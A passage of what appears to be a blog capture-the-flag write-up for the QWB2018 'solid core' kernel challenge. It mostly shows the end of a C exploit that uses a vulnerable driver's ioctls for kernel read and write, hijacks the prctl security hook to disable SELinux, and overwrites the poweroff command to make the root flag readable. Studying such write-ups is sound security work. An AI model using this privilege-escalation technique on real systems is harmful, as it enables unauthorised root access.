ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel);</span><br><span class="line">  <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">    error(<span class="string">"alloc ioctl"</span>);</span><br><span class="line">  id = alloc_channel.id;</span><br><span class="line">  shrink_channel.size = <span class="number">2</span>;  <span class="comment">//shrink channel size to -1</span></span><br><span class="line">  shrink_channel.id = id;</span><br><span class="line">  ret = ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel);</span><br><span class="line">  <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">    error(<span class="string">"shrink ioctl"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Scanning for elf headers to find VDSO</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> header = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> loc = <span class="number">0xffffffff80000000</span>;</span><br><span class="line">  <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (; loc&lt;<span class="number">0xffffffffffffafff</span>; loc+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">      read_kernel_memory(fd,id,loc,&amp;header,<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> (header==<span class="number">0x010102464c457f</span>) &#123;</span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"%p elf\n"</span>,loc);</span><br><span class="line">          read_kernel_memory(fd,id,loc+<span class="number">0x2B8</span>,&amp;header,<span class="number">8</span>);</span><br><span class="line">          <span class="comment">//Look for 'clock_ge' signature (may not be at this offset, but happened to be)</span></span><br><span class="line">          <span class="keyword">if</span> (header == <span class="number">0x65675f6b636f6c63</span>) &#123;</span><br><span class="line">              <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"%p found it?\n"</span>,loc);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> vdso = loc;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> base = vdso &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">  header = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> sbin_poweroff = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span> i = <span class="number">0x13d1e0</span>;i &lt;= <span class="number">0xf3d1e0</span>;i+=<span class="number">0x100000</span>)&#123;</span><br><span class="line">    read_kernel_memory(fd,id,base+i,&amp;header,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(header==<span class="number">0x6f702f6e6962732f</span>)&#123; <span class="comment">// "/sbin/poweroff"</span></span><br><span class="line">      sbin_poweroff = base + i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!header)&#123;</span><br><span class="line">    error(<span class="string">"sbin_poweroff not found !"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"sbin_poweroff = %p "</span>,sbin_poweroff);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> set_memory_rw = sbin_poweroff - <span class="number">0x11c3ea0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_disable = set_memory_rw + <span class="number">0x24e860</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> security_task_prctl = set_memory_rw + <span class="number">0x2440d0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> hook_addr = sbin_poweroff + <span class="number">0x12b20</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> orderly_poweroff = set_memory_rw + <span class="number">0x22cc0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"set_memory_rw = %p\n"</span>,set_memory_rw);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"selinux_disable = %p\n"</span>,selinux_disable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"security_task_prctl = %p\n"</span>,security_task_prctl);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hijiack Prctl to selinux_disable"</span>);</span><br><span class="line">  write_kernel_memory(fd,id,hook_addr,&amp;selinux_disable,<span class="number">8</span>);</span><br><span class="line">  prctl(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> cmd[] = <span class="string">"/bin/chmod 777 /root/flag"</span>;</span><br><span class="line"></span><br><span class="line">  write_kernel_memory(fd,id,sbin_poweroff,cmd,<span class="keyword">sizeof</span>(cmd));</span><br><span class="line">  write_kernel_memory(fd,id,hook_addr,&amp;orderly_poweroff,<span class="number">8</span>);</span><br><span class="line">  prctl(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Reference: <a href="http://leanote.com/blog/post/5ab78270ab64413755000dcf" target="_blank" rel="noopener">http://leanote.com/blog/post/5ab78270ab64413755000dcf</a></p>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/03/28/ROP-in-Linux-Kernel/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">Close</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Blog
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Cago
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Link
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              Srch
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'f0r1st';
+    
+    var disqus_url = 'http://yoursite.com/2018/04/02/QWB2018-solid-core-Write-Up/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//f0r1st.disqus.com/count.js" async></script>
+
+
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
